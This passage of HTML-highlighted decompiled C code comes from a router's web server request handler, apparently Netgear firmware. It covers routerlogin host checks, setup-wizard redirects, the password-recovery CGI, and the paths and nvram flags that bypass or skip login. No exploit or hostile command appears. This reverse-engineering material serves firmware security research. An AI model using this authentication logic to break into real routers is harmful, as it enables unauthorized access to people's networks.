class="keyword">if</span> ( *v40 == <span class="number">99</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_581:</span><br><span class="line">      <span class="keyword">if</span> ( is_captive_detecting(host, dword_42C8B8) )</span><br><span class="line">      &#123;</span><br><span class="line">        dword_42C9DC = <span class="number">1</span>;</span><br><span class="line">        dword_42C88C = <span class="built_in">strpbrk</span>(path, <span class="string">&quot; \t\n\r&quot;</span>);</span><br><span class="line">        v17 = <span class="number">200</span>;</span><br><span class="line">        v19 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        v18 = <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">        v20 = <span class="string">&quot;Success&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_556;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !host &amp;&amp; dword_42C9D8 == <span class="number">1</span> )</span><br><span class="line">    host = <span class="string">&quot;www.routerlogin.com&quot;</span>;</span><br><span class="line">  is_usb_session = usb_session_check();</span><br><span class="line">  v41 = host;</span><br><span class="line">  v42 = nvram_get(<span class="string">&quot;lan_ipaddr&quot;</span>);</span><br><span class="line">  v43 = v41;</span><br><span class="line">  v44 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v43, v42) )</span><br><span class="line">    v44 = <span class="built_in">strstr</span>(host, <span class="string">&quot;routerlogin&quot;</span>) != <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *nvram_get(<span class="string">&quot;http_server_wan_enable&quot;</span>) == <span class="number">49</span> &amp;&amp; *nvram_get(<span class="string">&quot;fw_remote&quot;</span>) == <span class="number">48</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v45 = nvram_get(<span class="string">&quot;wifi_ap_mode&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v45 )</span><br><span class="line">      v45 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *v45 == <span class="number">49</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v44 || (v235 = host, v46 = getIPAddress(<span class="string">&quot;group1&quot;</span>), !<span class="built_in">strcmp</span>(v235, v46)) )</span><br><span class="line">        v44 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !(v44 | is_usb_session) )</span><br><span class="line">    &#123;</span><br><span class="line">      v44 = <span class="number">0</span>;</span><br><span class="line">      nvram_get(<span class="string">&quot;config_state&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *nvram_get(<span class="string">&quot;http_server_wan_enable&quot;</span>) == <span class="number">48</span></span><br><span class="line">    &amp;&amp; *nvram_get(<span class="string">&quot;fw_remote&quot;</span>) == <span class="number">49</span></span><br><span class="line">    &amp;&amp; *nvram_get(<span class="string">&quot;config_state&quot;</span>) == <span class="number">115</span></span><br><span class="line">    &amp;&amp; is_usb_session</span><br><span class="line">    &amp;&amp; !v44 )</span><br><span class="line">  &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/echo drop request usb &gt; /dev/console&quot;</span>);</span><br><span class="line">    v1 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_106;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( is_usb_session )</span><br><span class="line">  &#123;</span><br><span class="line">    dword_42C870 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( port == <span class="number">443</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v47 = nvram_get(<span class="string">&quot;http_server_wan_enable&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v47 )</span><br><span class="line">        v47 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      <span class="keyword">if</span> ( atoi(v47) == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v48 = nvram_get(&amp;unk_416A20);</span><br><span class="line">        <span class="keyword">if</span> ( !v48 )</span><br><span class="line">          v48 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( atoi(v48) == <span class="number">443</span> )</span><br><span class="line">          strlcpy(remote_ip, current_remote_ip, <span class="number">48</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v49 = check_valid_request();</span><br><span class="line">  v17 = <span class="number">403</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v49 )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = <span class="string">&quot;Forbidden&quot;</span>;</span><br><span class="line">    v19 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    v20 = <span class="string">&quot;URL is illegal.&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_556;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(path, <span class="string">&quot;setupwizard.cgi&quot;</span>) )</span><br><span class="line">    dword_42C9D8 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( dword_42C9D8 == <span class="number">1</span> &amp;&amp; !check_lan_guest() )</span><br><span class="line">  &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/echo genie from wan, drop request now &gt; /dev/console&quot;</span>);</span><br><span class="line">    v1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_106;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( dword_42C9D8 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/echo it is for setupwizard! &gt;&gt; /tmp/sw.log&quot;</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(byte_42C9E0, <span class="string">&quot;/setupwizard.cgi HTTP/1.1\r\n&quot;</span>);</span><br><span class="line">    path = byte_42C9E0;</span><br><span class="line">    <span class="keyword">if</span> ( dword_42C8D4 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      dword_42CBE0 = <span class="number">0</span>;</span><br><span class="line">      dword_42CBE4 = <span class="number">0</span>;</span><br><span class="line">      dword_42CBE8 = <span class="number">0</span>;</span><br><span class="line">      dword_42CBEC = <span class="number">0</span>;</span><br><span class="line">      byte_42CBF0 = <span class="number">0</span>;</span><br><span class="line">      v50 = <span class="built_in">strchr</span>(dword_42C8AC, <span class="number">61</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v50 )</span><br><span class="line">        strlcpy(&amp;dword_42CBE0, v50 + <span class="number">1</span>, <span class="number">17</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !access(<span class="string">&quot;/tmp/dnshj.out&quot;</span>, <span class="number">0</span>) &amp;&amp; (!<span class="built_in">strstr</span>(host, <span class="string">&quot;routerlogin&quot;</span>) || !<span class="built_in">strncmp</span>(path, <span class="string">&quot;/ &quot;</span>, <span class="number">2u</span>)) )</span><br><span class="line">    &#123;</span><br><span class="line">      v51 = dword_42B664;</span><br><span class="line">      <span class="keyword">if</span> ( !dword_42B664 )</span><br><span class="line">        v51 = <span class="string">&quot;indexdnshj.htm&quot;</span>;</span><br><span class="line">      <span class="built_in">snprintf</span>(byte_42C9E0, <span class="number">0x200</span>u, <span class="string">&quot;/ca/setup.cgi?next_file=%s HTTP/1.1\r\n&quot;</span>, v51);</span><br><span class="line">      path = byte_42C9E0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( access(<span class="string">&quot;/tmp/blank_state.out&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !access(<span class="string">&quot;/tmp/tm_already_warning&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">        unlink(<span class="string">&quot;/tmp/tm_already_warning&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v52 = sub_405EE4(<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !strcasecmp(v11, v52) )</span><br><span class="line">      &#123;</span><br><span class="line">        v53 = path;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">strstr</span>(path, <span class="string">&quot;.htm&quot;</span>) || !<span class="built_in">strncmp</span>(v53, <span class="string">&quot;/ HTTP&quot;</span>, <span class="number">6u</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v235 = host;</span><br><span class="line">          v54 = nvram_get(<span class="string">&quot;lan_ipaddr&quot;</span>);</span><br><span class="line">          v55 = <span class="built_in">strcmp</span>(v235, v54);</span><br><span class="line">          haystack = <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">if</span> ( v55 )</span><br><span class="line">            haystack = (<span class="built_in">strstr</span>(host, <span class="string">&quot;routerlogin&quot;</span>) != <span class="number">0</span>);</span><br><span class="line">          nvram_get(<span class="string">&quot;tm_action_internet&quot;</span>);</span><br><span class="line">          v56 = path;</span><br><span class="line">          v232 = <span class="built_in">strstr</span>(path, <span class="string">&quot;traffic_status.htm&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> ( !haystack || (v57 = <span class="built_in">strstr</span>(v56, <span class="string">&quot;_h.htm&quot;</span>) != <span class="number">0</span>, access(<span class="string">&quot;/tmp/tm_already_warning&quot;</span>, <span class="number">0</span>)) &amp;&amp; !v57 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">strcpy</span>(byte_42C9E0, <span class="string">&quot;/ HTTP/1.1\r\n&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( !v232 )</span><br><span class="line">            &#123;</span><br><span class="line">              v58 = fopen64(<span class="string">&quot;/tmp/blank_state.out&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">              v59 = v58;</span><br><span class="line">              <span class="keyword">if</span> ( v58 )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span> ( fgets(v230, <span class="number">99</span>, v58) &amp;&amp; (v60 = <span class="built_in">strstr</span>(v230, <span class="string">&quot;htm&quot;</span>)) != <span class="number">0</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  v60[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">                  <span class="built_in">snprintf</span>(byte_42C9E0, <span class="number">0x200</span>u, <span class="string">&quot;/setup.cgi?next_file=%s HTTP/1.1\r\n&quot;</span>, v230);</span><br><span class="line">                  <span class="keyword">if</span> ( access(<span class="string">&quot;/tmp/tm_block_internet&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">                  &#123;</span><br><span class="line">                    system(<span class="string">&quot;/usr/sbin/rc dnshj stop&quot;</span>);</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                  &#123;</span><br><span class="line">                    v235 = &amp;loc_410000;</span><br><span class="line">                    <span class="keyword">if</span> ( access(<span class="string">&quot;/tmp/tm_already_warning&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">                    &#123;</span><br><span class="line">                      v61 = fopen64(v235 + <span class="number">27444</span>, <span class="string">&quot;w+&quot;</span>);</span><br><span class="line">                      <span class="keyword">if</span> ( v61 )</span><br><span class="line">                        fclose(v61);</span><br><span class="line">                    &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">                  path = byte_42C9E0;</span><br><span class="line">                  dword_42A248 = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(v230, <span class="string">&quot;lan_wan_conflict&quot;</span>) &amp;&amp; !haystack )</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="built_in">snprintf</span>(byte_42C9E0, <span class="number">0x200</span>u, <span class="string">&quot;/setup.cgi?next_file=%s HTTP/1.1\r\n&quot;</span>, <span class="string">&quot;alert.htm&quot;</span>);</span><br><span class="line">                  path = byte_42C9E0;</span><br><span class="line">                &#125;</span><br><span class="line">                fclose(v59);</span><br><span class="line">                dword_42C870 = <span class="number">0</span>;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( access(<span class="string">&quot;/tmp/lan_ip_auto_changed&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_169:</span><br><span class="line">    <span class="keyword">if</span> ( !access(<span class="string">&quot;/tmp/conflict_warning&quot;</span>, <span class="number">0</span>) &amp;&amp; <span class="built_in">strstr</span>(path, <span class="string">&quot;settings.jpg&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      system(<span class="string">&quot;/bin/touch /tmp/stop_conflict_warning&quot;</span>);</span><br><span class="line">      unlink(<span class="string">&quot;/tmp/conflict_warning&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !access(<span class="string">&quot;/tmp/conflict_warning&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v65 = get_uptime(<span class="string">&quot;/tmp/conflict_warning&quot;</span>);</span><br><span class="line">      src = v65;</span><br><span class="line">      v66 = get_uptime(<span class="string">&quot;/proc/uptime&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( HIDWORD(v66) - HIDWORD(v65) != v66 &lt; src || (v66 - src) &gt;= <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        unlink(<span class="string">&quot;/tmp/conflict_warning&quot;</span>);</span><br><span class="line">        unlink(<span class="string">&quot;/tmp/lan_ip_auto_changed&quot;</span>);</span><br><span class="line">        unlink(<span class="string">&quot;/tmp/stop_conflict_warning&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/usr/sbin/rc dnshj stop&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v62 = dword_42C8B8;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(dword_42C8B8, <span class="string">&quot;Genie&quot;</span>) &amp;&amp; !<span class="built_in">strstr</span>(v62, <span class="string">&quot;LANWizard&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v63 = sub_405EE4(<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !strcasecmp(v11, v63) )</span><br><span class="line">      &#123;</span><br><span class="line">        v64 = path;</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(path, <span class="string">&quot;error-tab-rec.htm&quot;</span>)</span><br><span class="line">          &amp;&amp; (<span class="built_in">strstr</span>(v64, <span class="string">&quot;.htm&quot;</span>) || !<span class="built_in">strncmp</span>(v64, <span class="string">&quot;/ HTTP&quot;</span>, <span class="number">6u</span>) || <span class="built_in">strstr</span>(v64, <span class="string">&quot;.aspx&quot;</span>)) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( access(<span class="string">&quot;/tmp/conflict_warning&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            strlcpy(byte_42C9E0, <span class="string">&quot;/setup.cgi?next_file=BRS_wanlan_conflict.html HTTP/1.1\r\n&quot;</span>, <span class="number">512</span>);</span><br><span class="line">            path = byte_42C9E0;</span><br><span class="line">            system(<span class="string">&quot;/bin/cp /proc/uptime /tmp/conflict_warning&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      dword_42A248 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_169;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( access(<span class="string">&quot;/tmp/brs_hijack.out&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_235;</span><br><span class="line">  v67 = getIPAddress(<span class="string">&quot;group1&quot;</span>);</span><br><span class="line">  v68 = host;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(host, <span class="string">&quot;www.msftncsi.com&quot;</span>) &amp;&amp; <span class="built_in">strstr</span>(path, <span class="string">&quot;ncsi.txt&quot;</span>)</span><br><span class="line">    || !<span class="built_in">strcmp</span>(v68, <span class="string">&quot;www.msftconnecttest.com&quot;</span>) &amp;&amp; <span class="built_in">strstr</span>(path, <span class="string">&quot;connecttest.txt&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v17 = <span class="number">404</span>;</span><br><span class="line">    dword_42C88C = <span class="string">&quot;HTTP/1.0&quot;</span>;</span><br><span class="line">    v18 = &amp;unk_415C74;</span><br><span class="line">    v19 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">LABEL_546:</span><br><span class="line">    v20 = <span class="string">&quot;File not found.&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_556;</span><br><span class="line">  &#125;</span><br><span class="line">  v69 = socket(<span class="number">2</span>, <span class="number">3</span>, <span class="number">255</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v69 == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> (perror)(<span class="string">&quot;socket creating failed&quot;</span>);</span><br><span class="line">  v71 = nvram_get(<span class="string">&quot;wan_ifname&quot;</span>);</span><br><span class="line">  strlcpy(v229, v71, <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">if</span> ( ioctl(v69, <span class="number">0x8915</span>u, v229) )</span><br><span class="line">  &#123;</span><br><span class="line">    v80 = nvram_get(<span class="string">&quot;wifi_ap_mode&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v80 )</span><br><span class="line">      v80 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    v81 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *v80 )</span><br><span class="line">    &#123;</span><br><span class="line">      v81 = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(host, v67) )</span><br><span class="line">      &#123;</span><br><span class="line">        v82 = nvram_get(<span class="string">&quot;wifi_ap_mode&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !v82 )</span><br><span class="line">          v82 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        v81 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( atoi(v82) )</span><br><span class="line">        &#123;</span><br><span class="line">          v83 = host;</span><br><span class="line">          v84 = nvram_get(<span class="string">&quot;wifi_ap_name&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> ( !v84 )</span><br><span class="line">            v84 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">          v81 = strcasestr(v83, v84) != <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v85 = host;</span><br><span class="line">    v86 = nvram_get(<span class="string">&quot;lan_ipaddr&quot;</span>);</span><br><span class="line">    v87 = v85;</span><br><span class="line">    v78 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v87, v86) &amp;&amp; !<span class="built_in">strstr</span>(host, <span class="string">&quot;routerlogin&quot;</span>) )</span><br><span class="line">      v78 = v81;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v72 = inet_ntoa(v229[<span class="number">5</span>]);</span><br><span class="line">    v73 = strdup(v72);</span><br><span class="line">    v74 = host;</span><br><span class="line">    v76 = v73;</span><br><span class="line">    v75 = nvram_get(<span class="string">&quot;lan_ipaddr&quot;</span>);</span><br><span class="line">    v77 = v74;</span><br><span class="line">    v78 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v77, v75) )</span><br><span class="line">    &#123;</span><br><span class="line">      v79 = host;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(host, <span class="string">&quot;routerlogin&quot;</span>) )</span><br><span class="line">        v78 = <span class="built_in">strstr</span>(v79, v76) != <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v88 = sub_405EE4(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( strcasecmp(v11, v88)</span><br><span class="line">    || (v89 = path, <span class="built_in">strstr</span>(path, <span class="string">&quot;BRS_&quot;</span>))</span><br><span class="line">    || <span class="built_in">strstr</span>(v89, <span class="string">&quot;debug.htm&quot;</span>)</span><br><span class="line">    || <span class="built_in">strstr</span>(v89, <span class="string">&quot;currentsetting&quot;</span>)</span><br><span class="line">    || <span class="built_in">strstr</span>(v89, <span class="string">&quot;POT.htm&quot;</span>)</span><br><span class="line">    || <span class="built_in">strstr</span>(v89, <span class="string">&quot;sso&quot;</span>)</span><br><span class="line">    || <span class="built_in">strstr</span>(v89, <span class="string">&quot;POT&quot;</span>)</span><br><span class="line">    || !access(<span class="string">&quot;/tmp/wizard_vlan&quot;</span>, <span class="number">0</span>)</span><br><span class="line">    || !access(<span class="string">&quot;/tmp/conflict_warning&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_233:</span><br><span class="line">    <span class="keyword">if</span> ( !v78 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_234;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_235;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v78 &amp;&amp; !need_fakepath(path) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_235;</span><br><span class="line">  <span class="keyword">if</span> ( access(<span class="string">&quot;/tmp/brs_gui_hijack&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v78 )</span><br><span class="line">      v95 = <span class="string">&quot;App.html&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v95 = <span class="string">&quot;BRS_hijack_index.htm&quot;</span>;</span><br><span class="line">    <span class="built_in">snprintf</span>(byte_42C9E0, <span class="number">0x200</span>u, <span class="string">&quot;/setup.cgi?next_file=%s HTTP/1.1&quot;</span>, v95);</span><br><span class="line">    path = byte_42C9E0;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_233;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v78 )</span><br><span class="line">  &#123;</span><br><span class="line">    v90 = nvram_get(<span class="string">&quot;mandate_sso&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v90 )</span><br><span class="line">      v90 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *v90 != <span class="number">49</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_227;</span><br><span class="line">    v91 = nvram_get(<span class="string">&quot;config_state&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v91 )</span><br><span class="line">      v91 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *v91 != <span class="number">99</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_227;</span><br><span class="line">    v92 = nvram_get(<span class="string">&quot;sso_first_time&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v92 )</span><br><span class="line">      v92 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *v92 != <span class="number">48</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_227;</span><br><span class="line">    v93 = nvram_get(<span class="string">&quot;RAE_ssoGuiRegStatus&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v93 )</span><br><span class="line">      v93 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v93, <span class="string">&quot;InternetNA&quot;</span>) )</span><br><span class="line">      v94 = <span class="string">&quot;BRS_sso_hijack.html&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">LABEL_227:</span><br><span class="line">      v94 = <span class="string">&quot;BRS_hijack_success.htm&quot;</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(byte_42C9E0, <span class="string">&quot;/setup.cgi?next_file=%s HTTP/1.1&quot;</span>, v94);</span><br><span class="line">    path = byte_42C9E0;</span><br><span class="line">LABEL_234:</span><br><span class="line">    dword_42A248 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_235:</span><br><span class="line">  v96 = nvram_get(<span class="string">&quot;config_state&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v96 )</span><br><span class="line">    v96 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *v96 == <span class="number">98</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_241;</span><br><span class="line">  v97 = nvram_get(<span class="string">&quot;need_not_login&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v97 )</span><br><span class="line">    v97 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *v97 == <span class="number">49</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_241:</span><br><span class="line">    nvram_set(<span class="string">&quot;need_not_login&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">    nvram_set(<span class="string">&quot;start_in_blankstate&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( path_exist(path, off_42AEC4, v11) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_250;</span><br><span class="line">  v98 = path;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(path, <span class="string">&quot;htpwd_recovery.cgi&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v99 = sub_405EE4(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !strcasecmp(v11, v99) )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_250;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v98, <span class="string">&quot;PNPX_GetShareFolderList&quot;</span>) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_250;</span><br><span class="line">  v100 = nvram_get(<span class="string">&quot;config_state&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v100 )</span><br><span class="line">    v100 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *v100 == <span class="number">99</span> &amp;&amp; <span class="built_in">strstr</span>(path, <span class="string">&quot;sso&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_250:</span><br><span class="line">    dword_42C870 = <span class="number">0</span>;</span><br><span class="line">    dword_42A248 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(path, <span class="string">&quot;currentsetting.htm&quot;</span>) )</span><br><span class="line">      dword_42C9D8 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v101 = off_42AEC4;</span><br><span class="line">  v102 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( *v101 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(path, *v101) )</span><br><span class="line">      v102 = <span class="number">1</span>;</span><br><span class="line">    ++v101;</span><br><span class="line">  &#125;</span><br><span class="line">  v103 = path;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(path, <span class="string">&quot;sso.html&quot;</span>) &amp;&amp; !<span class="built_in">strstr</span>(v103, <span class="string">&quot;?token=&quot;</span>) &amp;&amp; !<span class="built_in">strstr</span>(v103, <span class="string">&quot;?error_code=2200&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v104 = nvram_get(<span class="string">&quot;sso_from_internet&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v104 )</span><br><span class="line">      v104 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *v104 == <span class="number">49</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v229[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">      LOBYTE(v229[<span class="number">1</span>]) = <span class="number">0</span>;</span><br><span class="line">      v105 = nvram_get(<span class="string">&quot;sso_fail_times&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v105 )</span><br><span class="line">        v105 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      v106 = atoi(v105) + <span class="number">1</span>;</span><br><span class="line">      nvram_set(<span class="string">&quot;RAE_ssoGuiRegStatus&quot;</span>, <span class="string">&quot;Failed&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v106 &lt; <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">sprintf</span>(v229, <span class="string">&quot;%d&quot;</span>, v106);</span><br><span class="line">        v107 = v229;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        nvram_set(<span class="string">&quot;sso_skip&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        v107 = <span 